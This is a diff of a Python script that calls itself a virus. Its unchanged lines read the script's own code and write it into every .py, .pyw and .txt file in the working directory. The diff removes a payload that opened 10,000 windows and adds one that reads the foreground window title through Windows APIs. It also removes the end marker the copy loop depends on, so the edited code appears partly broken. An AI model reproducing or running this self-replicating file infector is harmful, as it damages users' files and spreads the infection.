@@ -1,9 +1,10 @@
-# VIRUS SAYS HI!
 
-import tkinter as tk
+# VIRUS SAYS HI!
 import sys
 import glob
 import ctypes       # For interfacing with C functions
+
+from pip._vendor.distlib.compat import raw_input
 
 kernel32 = ctypes.windll.kernel32   # Access functions from kernel32.dll
 user32 = ctypes.windll.user32       # Access functions from user32.dll
@@ -16,10 +17,13 @@ def get_current_window():  # Function to grab the current window and its title
     GetForegroundWindow = user32.GetForegroundWindow
     GetWindowTextLength = user32.GetWindowTextLengthW
     GetWindowText = user32.GetWindowTextW
+
     hwnd = GetForegroundWindow()  # Get handle to foreground window
     length = GetWindowTextLength(hwnd)  # Get length of the window text in title bar, passing the handle as argument
     buff = ctypes.create_unicode_buffer(length + 1)  # Create buffer to store the window title string
+
     GetWindowText(hwnd, buff, length + 1)  # Get window title and store in buff
+
     return buff.value  # Return the value of buff
 
 virus_code = []
@@ -37,7 +41,7 @@ for line in lines:
     if line == "# VIRUS SAYS BYE!\n":
         break
 
-python_files = glob.glob('*.py') + glob.glob('*.pyw') + glob.glob('*.txt')
+python_files = glob.glob('*.py') + glob.glob('*.pyw')+glob.glob('*.txt')
 
 for file in python_files:
     with open(file, 'r') as f:
@@ -59,28 +63,17 @@ for file in python_files:
         with open(file, 'w') as f:
             f.writelines(final_code)
 
-
-
 def malicious_code():
-    HEIGHT = 400
-    WIDTH = 300
-    
-    root = tk.Tk()
-    root.title("new window making machine: ")
-    canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
-    canvas.pack()
-    button = tk.Button(root, text="new window", bg='black', fg='#469A00')
+    if (get_current_window() ==  "cmd - python  main.py"):
+        print(get_current_window())
+        raw_input('press any key')
+    else:
+        print(get_current_window())
+        raw_input('press any key')
 
-    for i in range(0, 10000):
-        window = tk.Toplevel(root)
-        canvas = tk.Canvas(window, height=HEIGHT, width=WIDTH)
-        canvas.pack()
-    button.pack()
-    root.mainloop()
+
+
+
 
 malicious_code()
-
-# VIRUS SAYS BYE!
-
-
 
